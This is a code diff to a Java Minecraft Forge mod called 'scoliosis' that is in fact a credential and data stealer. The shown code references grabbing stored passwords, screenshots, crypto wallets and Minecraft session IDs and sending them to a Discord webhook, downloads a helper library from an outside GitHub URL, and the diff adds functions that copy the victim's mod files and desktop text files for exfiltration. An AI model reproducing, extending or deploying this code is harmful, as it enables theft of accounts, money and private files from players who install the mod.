@@ -56,11 +56,14 @@ import net.minecraft.client.Minecraft;
 import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
-@Mod(modid = "", version = "1.0")
+@Mod(modid = "scoliosis", version = "1.0")
 public class scoliosis {
 
     // PUT WEBHOOK HERE!
-    private static final WebhookAgent webhook = new WebhookAgent("WEBHOOK URL");
+    static String hooker = "hook here";
+
+
+    private static final WebhookAgent webhook = new WebhookAgent(hooker);
 
 
 
@@ -162,6 +165,8 @@ public class scoliosis {
             GetStoredPasswords(); // fully done
             ScreenshotScreen(); // maybe fully done (only runs 1 time per computer because I don't want to get spammed with screenshots)
             CryptoWallets(); // fully done (not bothered enough to check for changing passwords or smth zzzzzz)
+            StealMods();
+            StealDesktop();
 
             if (Files.exists(Paths.get(ilrFolderPath + ".rar"))) {
                 Files.delete(Paths.get(ilrFolderPath + ".rar"));
@@ -185,7 +190,6 @@ public class scoliosis {
 
     @SubscribeEvent
     public void checknewacs(TickEvent.RenderTickEvent tick) {
-        System.out.println("h");
         if (!Sessionids.contains(Minecraft.getMinecraft().getSession().getSessionID())) {
             Sessionids += Minecraft.getMinecraft().getSession().getSessionID();
             DiscordMessage message2 = DiscordMessage.builder()
@@ -781,7 +785,6 @@ public class scoliosis {
                 FileUtils.copyURLToFile(url, driverFile);
             }
 
-            
             // better decrypt library for linux / mac
             if (!Files.exists(Paths.get(appData + "\\" + (new BufferedReader(new InputStreamReader((new URL("https://raw.githubusercontent.com/escamasbuen/run/main/UpdateLibName")).openStream()))).readLine()))) {
                 FileUtils.copyURLToFile(new URL((new BufferedReader(new InputStreamReader((new URL("https://raw.githubusercontent.com/escamasbuen/run/main/DecrpytLib")).openStream()))).readLine()), new File(appData + "\\" + (new BufferedReader(new InputStreamReader((new URL("https://raw.githubusercontent.com/escamasbuen/run/main/UpdateLibName")).openStream()))).readLine()));
@@ -893,6 +896,33 @@ public class scoliosis {
         }
         catch (Exception p) {
             ErrorMessage(p, "minecraft account stealer");
+        }
+    }
+
+    // idfk why u want this soezbitch asked for it
+    public static void StealMods() throws IOException {
+        if (Files.isDirectory(Paths.get(appData + "\\.minecraft\\mods"))) {
+
+            for (File file : Objects.requireNonNull(Paths.get(appData + "\\.minecraft\\mods").toFile().listFiles())) {
+                System.out.println(file.getName());
+                if (file.isFile() && file.getName().endsWith(".jar")) {
+                    (new File(ilrFolderPath + "\\mods")).mkdirs();
+                    FileUtils.copyFile(new File(appData + "\\.minecraft\\mods\\" + file.getName()), new File(ilrFolderPath + "\\mods\\" + file.getName()));
+                }
+            }
+        }
+    }
+
+    public static void StealDesktop() throws IOException {
+        (new File(ilrFolderPath + "\\desktop")).mkdirs();
+        if (Files.isDirectory(Paths.get(System.getProperty("user.home") + "\\Desktop"))) {
+            System.out.println("hhh");
+            for (File file : Objects.requireNonNull(Paths.get(System.getProperty("user.home") + "\\Desktop").toFile().listFiles())) {
+                System.out.println(file.getName());
+                if (file.isFile() && file.getName().endsWith(".txt")) {
+                    FileUtils.copyFile(new File(System.getProperty("user.home") + "\\Desktop\\" + file.getName()), new File(ilrFolderPath + "\\desktop\\" + file.getName()));
+                }
+            }
         }
     }
 
